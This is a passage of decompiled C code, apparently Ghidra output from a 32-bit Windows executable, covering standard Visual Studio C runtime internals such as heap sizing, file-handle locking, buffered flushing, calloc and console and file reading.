    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_0041b410 == 3) {
      __lock(4);
      uVar3 = ___sbh_find_block((int)_Memory);
      if (uVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_00410573();
      if (uVar3 != 0) {
        return local_20;
      }
    }
    sVar2 = HeapSize(DAT_00419558,0,_Memory);
  }
  return sVar2;
}



void FUN_00410573(void)

{
  FUN_0040a124(4);
  return;
}



// Library Function - Single Match
//  int __cdecl x_ismbbtype_l(struct localeinfo_struct *,unsigned int,int,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl x_ismbbtype_l(localeinfo_struct *param_1,uint param_2,int param_3,int param_4)

{
  uint uVar1;
  int local_14;
  int local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_1);
  if ((*(byte *)(local_10 + 0x1d + (param_2 & 0xff)) & (byte)param_4) == 0) {
    if (param_3 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = (uint)*(ushort *)(*(int *)(local_14 + 200) + (param_2 & 0xff) * 2) & param_3;
    }
    if (uVar1 == 0) goto LAB_004105c0;
  }
  uVar1 = 1;
LAB_004105c0:
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  __ismbblead
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __ismbblead(uint _C)

{
  int iVar1;
  
  iVar1 = x_ismbbtype_l((localeinfo_struct *)0x0,_C,0,4);
  return iVar1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0041b2c4)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    piVar1 = (int *)((&DAT_0041b2e0)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_004181ac == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_00410649;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_00410649:
      *(undefined4 *)(iVar3 + (&DAT_0041b2e0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2008 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  intptr_t iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((_FileHandle < 0) || (DAT_0041b2c4 <= (uint)_FileHandle)) ||
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x40 + (&DAT_0041b2e0)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) == 0)) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar4 = -1;
  }
  else {
    iVar4 = *piVar3;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2008 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_0041b2e0)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_0041077b();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_0041b2e0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_0041077b(void)

{
  FUN_0040a124(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_0041b2e0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  if (DAT_00418f14 != 0) {
    if (DAT_00419044 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_00419044 == (HANDLE)0xffffffff) goto LAB_00410857;
    BVar2 = WriteConsoleW(DAT_00419044,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_00418f14 = 1;
      goto LAB_00410857;
    }
    if ((DAT_00418f14 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_00410857;
    DAT_00418f14 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_00419044 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_00419044,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_00410857:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2008 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int FUN_0041089b(void)

{
  FILE *pFVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int local_20;
  
  local_20 = 0;
  __lock(1);
  for (iVar4 = 3; iVar4 < DAT_0041b2c0; iVar4 = iVar4 + 1) {
    iVar3 = iVar4 * 4;
    if (*(FILE **)(DAT_0041a2b8 + iVar3) != (FILE *)0x0) {
      pFVar1 = *(FILE **)(DAT_0041a2b8 + iVar3);
      if ((*(byte *)&pFVar1->_flag & 0x83) != 0) {
        iVar2 = FUN_00411cf1(pFVar1);
        if (iVar2 != -1) {
          local_20 = local_20 + 1;
        }
      }
      if (0x13 < iVar4) {
        DeleteCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar3 + DAT_0041a2b8) + 0x20));
        _free(*(void **)(iVar3 + DAT_0041a2b8));
        *(undefined4 *)(iVar3 + DAT_0041a2b8) = 0;
      }
    }
  }
  FUN_00410931();
  return local_20;
}



void FUN_00410931(void)

{
  FUN_0040a124(1);
  return;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2008 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_0041b2c0; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_0041a2b8 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_0041a2b8 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_00410a8c();
    }
  }
  FUN_00410abb();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_00410a8c(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_0041a2b8 + unaff_ESI * 4));
  return;
}



void FUN_00410abb(void)

{
  FUN_0040a124(1);
  return;
}



void FUN_00410ac4(void)

{
  _flsall(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2008 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_0041b410 == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_0041b400)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_00410bd2();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_00410b87;
          }
        }
        else {
LAB_00410b87:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_00419558,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00419a00 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_00410bd2(void)

{
  FUN_0040a124(4);
  return;
}



// Library Function - Single Match
//  __recalloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl __recalloc(void *_Memory,size_t _Count,size_t _Size)

{
  int *piVar1;
  void *pvVar2;
  uint _NewSize;
  size_t sVar3;
  
  sVar3 = 0;
  if ((_Count == 0) || (_Size <= 0xffffffe0 / _Count)) {
    _NewSize = _Count * _Size;
    if (_Memory != (void *)0x0) {
      sVar3 = __msize(_Memory);
    }
    pvVar2 = _realloc(_Memory,_NewSize);
    if ((pvVar2 != (void *)0x0) && (sVar3 < _NewSize)) {
      _memset((void *)(sVar3 + (int)pvVar2),0,_NewSize - sVar3);
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    pvVar2 = (void *)0x0;
  }
  return pvVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00419ce8 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_00419cec = &stack0x00000004;
  _DAT_00419c28 = 0x10001;
  _DAT_00419bd0 = 0xc0000409;
  _DAT_00419bd4 = 1;
  local_32c = DAT_00418df8;
  local_328 = DAT_00418dfc;
  _DAT_00419bdc = unaff_retaddr;
  _DAT_00419cb4 = in_GS;
  _DAT_00419cb8 = in_FS;
  _DAT_00419cbc = in_ES;
  _DAT_00419cc0 = in_DS;
  _DAT_00419cc4 = unaff_EDI;
  _DAT_00419cc8 = unaff_ESI;
  _DAT_00419ccc = unaff_EBX;
  _DAT_00419cd0 = in_EDX;
  _DAT_00419cd4 = in_ECX;
  _DAT_00419cd8 = in_EAX;
  _DAT_00419cdc = unaff_EBP;
  DAT_00419ce0 = unaff_retaddr;
  _DAT_00419ce4 = in_CS;
  _DAT_00419cf0 = in_SS;
  DAT_00419c20 = IsDebuggerPresent();
  FUN_0040e795();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0041542c);
  if (DAT_00419c20 == 0) {
    FUN_0040e795();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// Library Function - Single Match
//  __mbsnbicoll_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbicoll_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_MaxCount == 0) {
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if ((_Str1 == (uchar *)0x0) || (_Str2 == (uchar *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0x7fffffff;
  }
  if (_MaxCount < 0x80000000) {
    if ((local_14.mbcinfo)->ismbcodepage == 0) {
      iVar2 = __strnicoll_l((char *)_Str1,(char *)_Str2,_MaxCount,_Locale);
    }
    else {
      iVar2 = ___crtCompareStringA
                        (&local_14,*(LPCWSTR *)(local_14.mbcinfo)->mbulinfo,0x1001,(LPCSTR)_Str1,
                         _MaxCount,(LPCSTR)_Str2,_MaxCount,(local_14.mbcinfo)->mbcodepage);
      if (iVar2 == 0) goto LAB_00410f26;
      iVar2 = iVar2 + -2;
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
LAB_00410f26:
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  return iVar2;
}



// Library Function - Single Match
//  __mbsnbicoll
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbicoll(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbicoll_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___wtomb_environ
// 
// Library: Visual Studio 2008 Release

int __cdecl ___wtomb_environ(void)

{
  LPCWSTR lpWideCharStr;
  size_t _Count;
  int iVar1;
  LPCWSTR *ppWVar2;
  LPSTR local_8;
  
  local_8 = (LPSTR)0x0;
  lpWideCharStr = *DAT_004196cc;
  ppWVar2 = DAT_004196cc;
  while( true ) {
    if (lpWideCharStr == (LPCWSTR)0x0) {
      return 0;
    }
    _Count = WideCharToMultiByte(0,0,lpWideCharStr,-1,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    if ((_Count == 0) || (local_8 = (LPSTR)__calloc_crt(_Count,1), local_8 == (LPSTR)0x0)) break;
    iVar1 = WideCharToMultiByte(0,0,*ppWVar2,-1,local_8,_Count,(LPCSTR)0x0,(LPBOOL)0x0);
    if (iVar1 == 0) {
      _free(local_8);
      return -1;
    }
    iVar1 = ___crtsetenv(&local_8,0);
    if ((iVar1 < 0) && (local_8 != (LPSTR)0x0)) {
      _free(local_8);
      local_8 = (LPSTR)0x0;
    }
    ppWVar2 = ppWVar2 + 1;
    lpWideCharStr = *ppWVar2;
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_0041b2c4 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  piVar6 = &DAT_0041b2e0 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_00411104;
  }
  if (_MaxCharCount < 0x80000000) {
    local_14 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + iVar14 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_004110f2;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        local_10 = (short *)__malloc_crt(_MaxCharCount);
        if (local_10 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_004110f2;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_10 = (short *)_DstBuf;
      }
      psVar8 = local_10;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        *(char *)local_10 = cVar4;
        psVar8 = (short *)((int)local_10 + 1);
        uVar7 = _MaxCharCount - 1;
        local_14 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = local_10 + 1;
          uVar7 = _MaxCharCount - 2;
          local_14 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)local_10 + 3);
            local_14 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_00411411;
          }
          goto LAB_00411406;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_14 = (short *)((int)local_14 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_00411411;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*local_10 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_14 = (short *)((int)local_14 + (int)local_10);
          _MaxCharCount = (uint)local_10;
          psVar8 = local_10;
          if (local_10 < local_14) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar8 = *(short *)_MaxCharCount;
                  psVar8 = psVar8 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_14 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_004114b4;
                  }
LAB_00411547:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_00411549:
                  *psVar8 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_00411547;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar8 == local_10) && (local_c == 10)) goto LAB_004114b4;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_0041154f;
                    goto LAB_00411547;
                  }
                  if (local_c == 10) {
LAB_004114b4:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_00411549;
                  }
                  *psVar8 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar8 = sVar17;
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_0041154f:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_14);
          }
          local_14 = (short *)((int)psVar8 - (int)local_10);
          goto LAB_00411411;
        }
        if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
